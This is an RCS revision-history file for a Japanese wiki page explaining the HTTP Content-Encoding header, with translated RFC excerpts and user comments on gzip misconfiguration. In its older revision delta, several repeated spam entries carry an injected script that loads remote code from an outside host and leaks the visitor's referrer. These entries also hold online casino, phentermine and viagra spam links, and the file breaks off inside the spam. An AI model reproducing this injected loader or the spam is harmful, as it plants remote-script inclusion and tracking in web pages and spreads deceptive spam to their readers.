@@ -1,0 +1,845 @@
+head	1.11;
+access;
+symbols
+	suika-20100509:1.6
+	before-graph-20090923:1.6;
+locks; strict;
+comment	@# @;
+expand	@b@;
+
+
+1.11
+date	2012.11.18.10.43.40;	author wakaba;	state Exp;
+branches;
+next	1.10;
+
+1.10
+date	2012.03.06.13.57.05;	author wakaba;	state Exp;
+branches;
+next	1.9;
+
+1.9
+date	2012.02.16.23.42.35;	author wakaba;	state Exp;
+branches;
+next	1.8;
+
+1.8
+date	2012.02.16.23.39.07;	author wakaba;	state Exp;
+branches;
+next	1.7;
+
+1.7
+date	2011.05.27.16.00.46;	author wakaba;	state Exp;
+branches;
+next	1.6;
+
+1.6
+date	2009.09.12.09.02.42;	author wakaba;	state Exp;
+branches;
+next	1.5;
+
+1.5
+date	2009.09.12.07.58.42;	author wakaba;	state Exp;
+branches;
+next	1.4;
+
+1.4
+date	2009.09.12.07.38.47;	author wakaba;	state Exp;
+branches;
+next	1.3;
+
+1.3
+date	2009.03.21.09.45.44;	author wakaba;	state Exp;
+branches;
+next	1.2;
+
+1.2
+date	2008.12.14.15.00.19;	author wakaba;	state Exp;
+branches;
+next	1.1;
+
+1.1
+date	2008.11.12.16.01.52;	author wakaba;	state Exp;
+branches;
+next	;
+
+
+desc
+@@
+
+
+1.11
+log
+@updated by (anon)
+@
+text
+@[4] [[HTTP]] [[メッセージ]]において、[[実体]]に対して ([[末端対末端]]レベルで)
+施されている[[符号化]]を[DFN[[RUBY[[[内容符号化]]][ないようふごうか]@@en[content-coding]]]]といいます。
+使用している[[内容符号化]]は [[HTTP]] [[メッセージ]]の
+[DFN[[CODE(HTTP)@@en[[[Content-Encoding:]]]] [[頭欄]]]]に記述します。
+
+[419] '''合わせて読みたい''': [[内容符号化と転送符号化]]、[[HTTP//変形]]
+
+* 値
+
+[417] [[内容符号化]]を表す値については、[[内容符号化と転送符号化]]の項をご覧ください。
+
+* 誤用
+
+- [9] [CODE(HTTP)[Content-Encoding: gzip]] かつ [CODE(HTTP)[[[Content-Type:]] application/x-gzip]] で送ってくるサーバーがありますが、ほとんど間違いなく間違いなので(謎)、止めた方がいいですね。
+-- [10] >>9 の問題の原因は実は [[Apache]] を [[distro]] 配布の [[RPM]] で入れたりした場合に、システム共用の [CODE(file)[[[/etc]]/[[mime.types]]]] が使われて、そのファイルに [CODE[application/x-gzip .gz]] って書いてある、って話だったりします。ちょっと困ったもんです。
+- [16] [CODE(HTTP)[Content-Encoding: gzip]] かつ [CODE(HTTP)[[[Content-Type:]] application/x-gzip]] というレスポンスは、
+[CODE[*.tar.gz]] などの形式で配布しているアーカイブのためなのでは無いのですか?
+([[ten]] [WEAK[2004-06-02 11:43:03 +00:00]])
+
+[17]
+>>16 そのような応答は、
+まず [CODE(HTTP)[Content-Encoding]] を復号して生に戻した状態で [CODE(MIME)[application/x-gzip]] として解釈するのが正解です。
+
+[CODE(file)[[VAR[*]].tar.gz]] を更にもう一度 gzip 
+で圧縮しているのであれば >>16 の通りで何ら問題ありませんが、
+[CODE(file)[[VAR[*]].tar.gz]] をそのまま送っているのであれば問題です 
+([CODE(MIME)[application/x-tar]] にでもなっていないと)。
+
+([[名無しさん]] [WEAK[2004-06-03 00:24:16 +00:00]])
+
+* 仕様書から
+
+** RFC 2616 の3.5 Content Codings
+
+[PRE[
+   Content coding values indicate an encoding transformation that has
+   been or can be applied to an entity. Content codings are primarily
+   used to allow a document to be compressed or otherwise usefully
+   transformed without losing the identity of its underlying media type
+   and without loss of information. Frequently, the entity is stored in
+   coded form, transmitted directly, and only decoded by the recipient.
+]PRE]
+
+- content-coding   = token
+
+[PRE[
+   All content-coding values are case-insensitive. HTTP/1.1 uses
+   content-coding values in the Accept-Encoding (section 14.3) and
+   Content-Encoding (section 14.11) header fields. Although the value
+   describes the content-coding, what is more important is that it
+   indicates what decoding mechanism will be required to remove the
+   encoding.
+]PRE]
+
+[PRE[
+   The Internet Assigned Numbers Authority (IANA) acts as a registry for
+   content-coding value tokens. Initially, the registry contains the
+   following tokens:
+]PRE]
+
+[PRE[
+   gzip An encoding format produced by the file compression program
+        "gzip" (GNU zip) as described in RFC 1952 [25]. This format is a
+        Lempel-Ziv coding (LZ77) with a 32 bit CRC.
+]PRE]
+
+ファイル圧縮プログラム「gzip」(GNU zip) で生成される符号化形式で、
+RFC 1952 で説明されているもの。この形式は Lempel-Ziv 符号化 (LZ77)
+と 32ビット [[CRC]] を使っています。
+
+[PRE[
+   compress
+        The encoding format produced by the common UNIX file compression
+        program "compress". This format is an adaptive Lempel-Ziv-Welch
+        coding (LZW).
+]PRE]
+
+共通 UNIX ファイル圧縮プログラム「compress」で生成される符号化形式。
+この形式は Lempel-Ziv-Welch 符号化 (LZW) の一応用です。
+
+[PRE[
+        Use of program names for the identification of encoding formats
+        is not desirable and is discouraged for future encodings. Their
+        use here is representative of historical practice, not good
+        design. For compatibility with previous implementations of HTTP,
+        applications SHOULD consider "x-gzip" and "x-compress" to be
+        equivalent to "gzip" and "compress" respectively.
+]PRE]
+
+符号化形式にプログラム名を使うのは望ましいことではなく、
+将来の符号化方式には推奨されません。ここで使っているのは
+歴史的習慣表現であって、良い設計とはいえません。
+HTTP の古い実装との互換性のため、応用は "x-gzip" と "x-compress"
+をそれぞれ "gzip" および "compress" と同様に解釈するのが
+'''望ましい'''です。
+
+[PRE[
+   deflate
+        The "zlib" format defined in RFC 1950 [31] in combination with
+        the "deflate" compression mechanism described in RFC 1951 [29].
+]PRE]
+
+RFC 1950 で定義された「zlib」形式と RFC 1951 で説明されている
+「deflate」 (収縮) 形式を組み合わせたものです。
+
+[PRE[
+   identity
+        The default (identity) encoding; the use of no transformation
+        whatsoever. This content-coding is used only in the Accept-
+        Encoding header, and SHOULD NOT be used in the Content-Encoding
+        header.
+]PRE]
+
+規定 (同等) 符号化方式。無変形に使います。この内容符号化は
+Accept-Encoding (承認符号化方式) 頭にのみ使われ、
+Content-Encoding (内容符号化方式) 頭に使う'''べきではありません'''。
+
+[PRE[
+   New content-coding value tokens SHOULD be registered; to allow
+   interoperability between clients and servers, specifications of the
+   content coding algorithms needed to implement a new value SHOULD be
+   publicly available and adequate for independent implementation, and
+   conform to the purpose of content coding defined in this section.
+]PRE]
+
+** HTTP/1.0 (RFC 1945) から抜粋
+
+[PRE[
+       content-coding = "x-gzip" | "x-compress" | token
+]PRE]
+
+[PRE[
+       Note: For future compatibility, HTTP/1.0 applications should
+       consider "gzip" and "compress" to be equivalent to "x-gzip"
+       and "x-compress", respectively.
+
+** RFC 1945 (HTTP/1.0) 10.3; RFC 2068 14.12・2616 14.11 (HTTP/1.1) Content-Encoding
+> The Content-Encoding entity-header field is used as a modifier to the
+media-type. When present, its value indicates what additional content
+codings have been applied to the entity-body, and thus what decoding
+mechanism[INS[s [INS[{2068}]]]] [DEL[[INS[{1945}]] must]] [INS[[INS[{2068}]] MUST]] [INS[[INS[{2616}]] must]] be applied in order to obtain the media-type
+referenced by the Content-Type header field. [DEL[[INS[{1945}]] The]] Content-Encoding is
+primarily used to allow a document to be compressed without losing
+the identity of its underlying media type.
+]PRE]
+
+[CODE(HTTP)[Content-Encoding]] 実体頭欄は、媒体型の修飾子として使います。
+示されている時、その値は何の追加の内容符号化が [CODE(ABNF)[entity-body]]
+に適用されており、ゆえに [CODE(HTTP)[[[Content-Type]]]]
+頭欄で参照している媒体型を得るためには何の復号機構を適用しなければならないかを示します。
+[CODE(HTTP)[Content-Encoding]] は主として元々の媒体型の識別を失うことなく文書を圧縮することを可能とするのに使います。
+
+>
+- Content-Encoding = "Content-Encoding" ":" [INS[[INS[{2068}]] 1#]]content-coding
+
+> Content codings are defined in [DEL[[INS[{1945}]] Section]] [INS[[INS[{2068}]] section]] 3.5. An example of its use is
+>
+- Content-Encoding: [DEL[[INS[{1945}]] x-]]gzip
+
+> The [DEL[[INS[{1945,2068}]] Content-Encoding]] [INS[[INS[{2616}]] [CODE(ABNF)[content-coding]]]] is a characteristic of the [DEL[[INS[{1945}]] resource]] [INS[[INS[{2068}]] entity]] identified by
+the Request-URI. Typically, the [DEL[[INS[{1945}]] resource]] [INS[[INS[{2068}]] entity-body]] is stored with this
+encoding and is only decoded before rendering or analogous usage. [INS[[INS[{2616}]] However, a non-transparent proxy MAY modify the content-coding if the new coding is known to be acceptable to the recipient, unless the "no-transform" cache-control directive is present in the message.]]
+
+[CODE(ABNF)[content-coding]] は、 [CODE(ABNF)[[[Request-URI]]]]]
+で識別される実体の特徴です。典型的には、 [CODE(ABNF)[[[entity-bnody]]]]
+はこの符号化で蓄積され、レンダリングや同様の使用の前にだけ復号されます。 [INS[しかし、非透過串は、メッセージに [CODE(HTTP)[[[no-transform]]]] [CODE(ABNF)[cache-control]] 指令が示されていない限り、新しい符号化が受信者に受入れ可能であると分かっているなら、 [CODE(ABNF)[content-coding]] を修正しても'''構いません'''。]]
+
+[INS[
+
+> [INS[{2616}]]  If the content-coding of an entity is not "identity", then the
+response MUST include a Content-Encoding entity-header (section
+14.11) that lists the non-identity content-coding(s) used.
+
+実体の [CODE(ABNF)[content-coding]] が [CODE(HTTP)[[[identity]]]]
+でないなら、応答は使用した非 identity [CODE(ABNF)[content-coding]] を列挙した 
+[CODE(HTTP)[Content-Encoding]] 実体頭欄を含めなければ'''なりません'''。
+
+> If the content-coding of an entity in a request message is not
+acceptable to the origin server, the server SHOULD respond with a
+status code of 415 (Unsupported Media Type).
+
+要求メッセージ中の実体の [CODE(ABNF)[content-coding]]
+が起源サーバーに受け入れ可能でないときには、サーバーは状態符号
+[CODE(HTTP)[[[415]]]] (未対応媒体型) で反応する'''べきです'''。
+]INS]
+
+[INS[
+
+> [INS[{2068,2616}]] If multiple encodings have been applied to an entity, the content
+codings MUST be listed in the order in which they were applied.
+> Additional information about the encoding parameters MAY be provided
+by other entity-header fields not defined by this specification.
+
+複数の符号化が実体に適用されている時は、内容符号化はそれが適用された順に列挙しなければ'''なりません'''。
+符号化引数についての追加情報をこの仕様書で定義していない他の実体頭欄で提供しても'''構いません'''。
+]INS]
+
+** RFC 1945 (HTTP/1.0) C.3; RFC 2068 (HTTP/1.1) 19.4.3; RFC 2616 (HTTP/1.1) 19.4.4 Introduction of Content-Encoding
+
+> [DEL[[DEL[RFC 1521]] [INS[MIME]]]] [INS[RFC 2045]] does not include any concept equivalent to [DEL[HTTP/1.0]] [INS[HTTP/1.1]]'s 
+Content-Encoding header field. Since this acts as a modifier on the media
+type, proxies and gateways from HTTP to MIME-compliant protocols [DEL[must]] [INS[MUST]]
+either change the value of the Content-Type header field or decode
+the [DEL[Entity-Body]] [INS[entity-body]] before forwarding the message. (Some experimental
+applications of Content-Type for Internet mail have used a media-type
+parameter of ";conversions=<content-coding>" to perform [DEL[an equivalent function as]] [INS[[INS[{2616}]] a function equivalent to]] Content-Encoding. However, this parameter is not part of [DEL[[DEL[RFC 1521]] [INS[MIME]]]] [INS[RFC 2045]].)
+
+[13] RFC 2045 は HTTP/1.1 の Content-Encoding
+頭欄に相当する概念を持っていません。
+この行為は媒体型を編集するものなので、 HTTP から MIME
+に従ったプロトコルへの串と関門は Content-Type
+頭欄の値を変えるか、[[実体本体]]をメッセージ転送の前に復号するかし'''なければなりません'''。
+(Internet メイルの実験的 Content-Type 応用には媒体型パラメーター
+";conversions=<content-coding>" を Content-Encoding
+に相当する機能に使っているものもあります。
+しかし、このパラメーターは RFC 2045 の一部ではありません。)
+
+[INS[
+
+[14] 訳注: [[application/octet-stream]]の [CODE[conversions]]
+パラメーターのことかな?
+]INS]
+
+[INS[
+
+注意: 注記のない修正点は RFC 1945 → RFC 2068 もの。
+]INS]
+
+**RFC 1945 (HTTP/1.0); RFC 2068・2616 (HTTP/1.1) 3.5 Content Codings
+
+[421] 
+> Content coding values [DEL[are used to]]
+indicate an encoding transformation that has been [INS[or can be]]
+applied to a[INS[n]] [DEL[resource]] [INS[entity]].
+Content codings are primarily used to allow a document to be compressed or [DEL[encrypted]] [INS[otherwise usefully transformed]]
+without losing the identity of its underlying media type [INS[and without loss of information]]. [DEL[Typically]] [INS[Frequently]], the [DEL[resource]] [INS[entity]] is stored in [DEL[this encoding]] [INS[coded form, transmitted directly,]] and only decoded [DEL[before rendering or analogous usage]] [INS[by the recipient]].
+
+内容符号化値は、[[実体]]に適用されている、またはすることのできる符号化変形を示します。
+内容符号化は、主として、もとの[[媒体型]]の識別を失うことなく、[INS[そして情報を失うことなく、]]文書を圧縮したり[DEL[暗号化したり]][INS[その他有用に変形したり]]するために使います。
+多くの場面では、実体は符号化形で蓄積され、直接転送され、[DEL[レンダリングや同様の使用の前に]][INS[受信者によって]]のみ復号されます。
+
+>
+- content-coding = [DEL["x-gzip" | "x-compress" |]] token
+
+[DEL[
+> Note: For future compatibility, HTTP/1.0 applications should
+consider "gzip" and "compress" to be equivalent to "x-gzip"
+and "x-compress", respectively.
+
+注意 : 将来との互換性のため、 HTTP/1.0 応用は
+[CODE(HTTP)[gzip]] および [CODE(HTTP)[compress]] をそれぞれ
+[CODE(HTTP)[x-gzip]] および [CODE(HTTP)[x-compress]]
+と同等とみなすべきです。
+]DEL]
+
+> All content-coding values are case-insensitive. [DEL[HTTP/1.0]] [INS[HTTP/1.1]] uses
+content-coding values in the [INS[Accept-Encoding (section 14.3) and]] Content-Encoding ([DEL[[INS[{1945}]] Section 10.3]] [INS[section [DEL[[INS[{2068}]] 14.12]] [INS[[INS[{2616}]] 14.11]]]]) header field[INS[s]].
+Although the value describes the content-coding, what is more
+important is that it indicates what decoding mechanism will be
+required to remove the encoding. [DEL[Note that a single program may be capable of decoding multiple content-coding formats. Two values are defined by this specification:]]
+
+すべての [CODE(ABNF)[content-coding]] 値は大文字・小文字を区別しません。
+HTTP は内容符号化値を [INS[[CODE(HTTP)[[[Accept-Encoding]]]] 頭欄と]]
+[CODE(HTTP)[[[Content-Encoding]]]] 頭欄で使います。
+この値は [CODE(ABNF)[content-coding]] を記述しますが、
+より重要なことは、この値が符号化を取り除くためにどの復号機構が必要であるかを示しているのだということです。[DEL[単一のプログラムに複数の [CODE(ABNF)[content-coding]] 書式を復号する能力があるかもしれないことに注意してください。この仕様書では2つの値を定義します:]]
+
+[INS[
+> The Internet Assigned Numbers Authority (IANA) acts as a registry for
+content-coding value tokens. Initially, the registry contains the
+following tokens:
+
+[[IANA]] が [CODE(ABNF)[content-coding]] 値字句の登録簿として機能します。
+はじめに、登録簿は次の字句を含みます :
+]INS]
+
+>
+: [DEL[x-]]gzip :
+An encoding format produced by the file compression program "gzip"
+(GNU zip) [DEL[developed by Jean-loup Gailly]] [INS[as described in RFC 1952 [25] ]]. This format is [DEL[typically]] a Lempel-Ziv coding (LZ77) with a 32 bit CRC.
+: [DEL[x-]]compress :
+> The encoding format produced by the [INS[common UNIX]] file compression
+program "compress". This format is an adaptive Lempel-Ziv-Welch
+coding (LZW).
+
+: [CODE(HTTP)[[DEL[x-]]gzip]] : [DEL[Jean‐loup Gailly が開発した]]ファイル圧縮プログラム [CODE[gzip]] (GNU zip)
+が生成する符号化書式[INS[で、 [[RFC1952]] で説明されている]]。
+この書式は[DEL[典型的には]] Lempel‐Ziv 符号化 ([[LZ77]])
+に32ビット [[CRC]] を加えたものである。
+: [CODE(HTTP)[[DEL[x-]]compress]] : [DEL[共通 UNIX]] ファイル圧縮プログラム
+[CODE[compress]] が生成する符号化書式。この書式は Lempel‐Ziv‐Welch
+符号化 ([[LZW]]) を使っている。
+
+> [DEL[[INS[{1945,2068}]] Note:]] Use of program names for the identification of encoding
+formats is not desirable and [DEL[[INS[{1945,2068}]] should be]] [INS[is]] discouraged for future
+encodings. Their use here is representative of historical practice,
+not good design. [INS[[INS[{2068,2616}]] For compatibility with previous implementations of HTTP, applications [DEL[should]] [INS[SHOULD]] consider "x-gzip" and "x-compress" to be equivalent to "gzip" and "compress" respectively.]]
+
+符号化書式の識別にプログラム名を使うことは望ましくなく、
+将来の符号化では非推奨[DEL[とするべき]]です。
+ここでそうしているのは歴史的なものであって、良い設計ではありません。[INS[HTTP の以前の実装との互換性のために、[[応用]]は [CODE(HTTP)[x-gzip]] と [CODE(HTTP)[x-compress]] をそれぞれ [CODE(HTTP)[gzip]] と [CODE(HTTP)[compress]] に等しいものとみなす'''べきです'''。]]
+
+[INS[
+> [INS[{2068,2616}]]
+: deflate : The "zlib" format defined in RFC 1950[31] in combination with
+the "deflate" compression mechanism described in RFC 1951[29].
+
+: [CODE(HTTP)[deflate]] : [[RFC1950]] で定義されている [CODE[zlib]]
+書式と [[RFC1951]] で説明されている [CODE[deflate]] 圧縮機構の組合せ。
+
+[INS[
+>[INS[{2616}]]
+: identity:
+The default (identity) encoding; the use of no transformation
+whatsoever. This content-coding is used only in the Accept-Encoding
+header, and SHOULD NOT be used in the Content-Encoding header.
+
+: [CODE(HTTP)[identity]] : 既定 (ママ) 符号化 — 特に何も変形していない。
+この [CODE(ABNF)[content-coding]] は [CODE(HTTP)[[[Accept-Encoding]]]]
+頭でのみ使用し、 [CODE(HTTP)[[[Content-Encoding]]]] 頭では使用する'''べきではない'''。
+]INS]
+
+> New content-coding value tokens [DEL[should]] [INS[SHOULD]] be registered; to allow
+interoperability between clients and servers, specifications of the
+content coding algorithms needed to implement a new value [DEL[should]] [INS[SHOULD]] be
+publicly available and adequate for independent implementation, and
+conform to the purpose of content coding defined in this section.
+
+新しい [CODE(ABNF)[content-coding]] 値字句は登録する'''べきです'''。
+[[クライアント]]と[[サーバー]]の間の相互運用性のために、
+新しい値を実装するのに必要な内容符号化算法の仕様書が公開で利用可能であり、独立した実装に適当であり、この節で定義した内容符号化の目的に適合するものである'''べきです'''。
+]INS]
+
+[INS[
+注 : 注記なき修正点は RFC 1945 → RFC 2068 における変更。
+]INS]
+**RFC 2295 (HTTP 透過内容折衝) 10.8 Negotiation on content encoding
+
+[420] 
+> Negotiation on the content encoding of a response is orthogonal to
+transparent content negotiation.  The rules for when a content
+encoding may be applied are the same as in HTTP/1.1: servers MAY
+content-encode responses that are the result of transparent content
+negotiation whenever an Accept-Encoding header in the request allows
+it.  When negotiating on the content encoding of a cacheable
+response, servers MUST add the accept-encoding header name to the
+Vary header of the response, or add `Vary: *'.
+
+応答の[[内容符号化]]に関する折衝は[[透過内容折衝]]とは直交します。
+内容符号化を適用しても良い場合についての規則は HTTP/1.1
+にあるのと同じで、サーバーは要求の [CODE(HTTP)[[[Accept-Encoding]]]]
+頭が認めているときはいつでも透過内容折衝の結果の応答を内容符号化しても'''構いません'''。
+[[キャッシュ可能]]応答の内容符号化の折衝の時には、
+サーバーは [CODE(HTTP)[accept-encoding]] 頭名を応答の [CODE(HTTP)[[[Vary]]]]
+頭に追加するか、 [CODE(HTTP)[Vary: *]] を追加するかしなければ'''なりません'''。
+
+> Servers SHOULD always be able to provide unencoded versions of every
+transparently negotiated response.  This means in particular that
+every variant in the variant list SHOULD at least be available in an unencoded form.
+
+サーバーは、各[[透過折衝可能応答]]の符号化されていない版を提供することが常に可能である'''べきです'''。
+これは、特に[[変種目録]]にある各変種は少なくても符号化されていない形式で利用可能である'''べきである'''ことを意味します。
+
+> Like HTTP/1.1, this specification allows proxies to encode or decode
+relayed or cached responses on the fly, unless explicitly forbidden
+by a Cache-Control directive.  The encoded or decoded response still
+contains the same variant as far as transparent content negotiation
+is concerned.  Note that HTTP/1.1 requires proxies to add a Warning
+header if the encoding of a response is changed.
+
+HTTP/1.1 同様に、この仕様書は、 [CODE(HTTP)[[[Cache-Control]]]]
+指令が陽に禁じていない限り、中継あるいはキャッシュする応答を串が自動で符号化したり復号したりすることを認めます。
+符号化あるいは復号した応答は、透過内容折衝に関する限りは依然として同じ変種を含んでいます。
+HTTP/1.1 は串が応答の符号化を変更した時には [CODE(HTTP)[[[Warning]]]]
+頭を追加することを要求しているのに注意してください。
+
+** RFC の部分の License
+
+[[RFCのライセンス]]
+
+* 関連
+
+[418] [[内容符号化と転送符号化]]の項もあわせてご覧ください。
+
+[422] [DFN[内容符号化]]は、 HTTP や派生プロトコルで[[実体]]に施されている符号化です。
+
+[[MIME]] 的には[[媒体型]]に含まれてしまいますが、
+媒体型を包含する別の媒体型とでも言うべき、独立したものであることが求められます。
+[WEAK[例えば圧縮なら、「[[PNG]] で使っている圧縮」のような特定の媒体型に依存したものではなく、「gzip」のように圧縮対象に依存しないものでないといけません。]]
+
+[[ホップ間]]の転送のための必要から行う変形は[[転送符号化]]というまた別のものになります。
+HTTP の転送符号化は MIME の[[内容転送符号化]]にほぼ相当しますが、
+これもやはり内容符号化とは別のものです。 (名前が似ているので注意。)
+
+[416] この欄は名前こそ [CODE[Content-]] がつきますが、
+[[MIME]] では規定されておらず、 HTTP 独自のものです。
+
+[2] 内容符号化は MIME の[[内容転送符号化]]や HTTP
+の[[転送符号化]]よりも上 (データ側) の層に当たります。
+MIME への[[関門]]では[[媒体型]]の指定に変換することが良いとされています。
+(例: HTTP: [SAMP(HTTP)[Content-Encoding: gzip]]
+→ MIME: [SAMP(HTTP)[Content-Type: [[application/x-gzip]]]])
+
+[423] [CODE(HTTP)@@en[[[Content-Encoding]]: [[identity]]]] を送ってくる[[鯖]]があります。
+これを[[鯖]]が意図したように扱えない[[クライアント]]があります。
+
+[REFS[
+- [424] [CITE@@en-us[SOAP over Java Message Service 1.0]]
+( ([TIME[2012-02-15 02:00:44 +09:00]] 版))
+<http://www.w3.org/TR/2012/REC-soapjms-20120216/#contentEncoding>
+]REFS]
+
+[425] [[合成型]]である [CODE(MIME)@@en[[[multipart/*]]]] や [CODE(MIME)@@en[[[message/*]]]] への適用について [[HTTP]]
+仕様には明記されていません。
+
+[426] [[SOAP/JMS]] では >>425 のケースで意味を未定義と明記しています [SRC[>>424]]。 
+規定がないことには違いありません。
+
+[427] [CITE@@en[RFC 4463 - A Media Resource Control Protocol (MRCP) Developed by Cisco, Nuance, and Speechworks]]
+( ([TIME[2011-12-04 10:31:11 +09:00]] 版))
+<http://tools.ietf.org/html/rfc4463#section-5.4.7>
+
+[428] [CITE@@en[RFC 6787 - Media Resource Control Protocol Version 2 (MRCPv2)]]
+( ([TIME[2012-11-13 15:18:40 +09:00]] 版))
+<http://tools.ietf.org/html/rfc6787#section-6.2.9>@
+
+
+1.10
+log
+@updated by (anon)
+@
+text
+@d421 5
+a425 1
+<http://tools.ietf.org/html/rfc4463#section-5.4.7>@
+
+
+1.9
+log
+@updated by (anon)
+@
+text
+@d417 5
+a421 1
+規定がないことには違いありません。@
+
+
+1.8
+log
+@updated by (anon)
+@
+text
+@d405 13
+a417 5
+これを[[鯖]]が意図したように扱えない[[クライアント]]があります。
+
+[424] [CITE@@en-us[SOAP over Java Message Service 1.0]]
+( ([TIME[2012-02-15 02:00:44 +09:00]] 版))
+<http://www.w3.org/TR/2012/REC-soapjms-20120216/#contentEncoding>@
+
+
+1.7
+log
+@updated by (anon)
+@
+text
+@d405 5
+a409 1
+これを[[鯖]]が意図したように扱えない[[クライアント]]があります。@
+
+
+1.6
+log
+@updated by (anon)
+@
+text
+@d403 3
+@
+
+
+1.5
+log
+@updated by (anon)
+@
+text
+@d229 147
+d384 10
+@
+
+
+1.4
+log
+@updated by (anon)
+@
+text
+@d6 2
+a10 1
+
+@
+
+
+1.3
+log
+@updated by (anon)
+@
+text
+@d1 4
+a4 1
+#?SuikaWiki/0.9 page-icon="HTTP"
+d6 3
+a8 2
+[4] [[HTTP]] で[[実体]]に対してどんな[[内容符号化]]が施されているのかを示すのが、
+[DFN[[CODE(HTTP)[Content-Encoding:]] 欄]]です。
+a9 2
+この欄は名前こそ [CODE[Content-]] がつきますが、
+[[MIME]] では規定されておらず、 HTTP 独自のものです。
+d11 1
+a11 5
+[2] 内容符号化は MIME の[[内容転送符号化]]や HTTP
+の[[転送符号化]]よりも上 (データ側) の層に当たります。
+MIME への[[関門]]では[[媒体型]]の指定に変換することが良いとされています。
+(例: HTTP: [SAMP(HTTP)[Content-Encoding: gzip]]
+→ MIME: [SAMP(HTTP)[Content-Type: [[application/x-gzip]]]])
+d30 1
+a30 4
+* 値
+
+→[[内容転送符号化]>>1]参照。
+
+d32 1
+a32 1
+* RFC 2616 の3.5 Content Codings
+d125 1
+a125 2
+
+* HTTP/1.0 (RFC 1945) から抜粋
+d135 1
+a135 1
+* 仕様書から
+a196 1
+
+d233 1
+d235 1
+a235 1
+* メモ
+d237 2
+a238 1
+- [11] [[mod_gzip]] とか流行ってるわけですが、ほんとは転送上の圧縮は [CODE(HTTP)[Content-Encoding]] じゃなくて [CODE(HTTP)[[[Transfar-Encoding]]]] 使うべきじゃないんですかね。もっとも、主要 [[UA]] で対応しているのは [[Opera]] だけという有様ですが。。。 (一方内容符号化はほとんどの主要 UA で扱えるから。。。)
+d240 5
+a244 6
+[15]
+ファイルとして保存する時に UA が [CODE(HTTP)[Content-Encoding]] (特に [CODE(HTTP)[gzip]] を展開してしまい、利用者は圧縮したものを受取ったつもりでいて混乱するという問題が多発していまして、
+内容折衝するのでもなければ [CODE(HTTP)[Content-Encoding]] は使うべきではないという意見すらありますね。
+
+本当は保存時に展開するかどうかを UA が利用者に尋ねるのが良いのでしょう。
+転送のためだけの圧縮も、 >>11 の言うように [CODE(HTTP)[Content-Encoding]] は使わずに [CODE(HTTP)[Transfer-Encoding]] にした方がいいでしょう。 [CODE(HTTP)[Transfer-Encoding]] に [CODE(HTTP)[gzip]] などが追加されたのはこの問題もたぶん考えてのことでしょう [WEAK[(という理由もあったのかどうかは調べてみないと分かりませんが)]]。
+@
+
+
+1.2
+log
+@updated by (anon)
+@
+text
+@a31 184
+[18]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[19]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[20]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[21]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[22]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[23]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[24]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[25]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
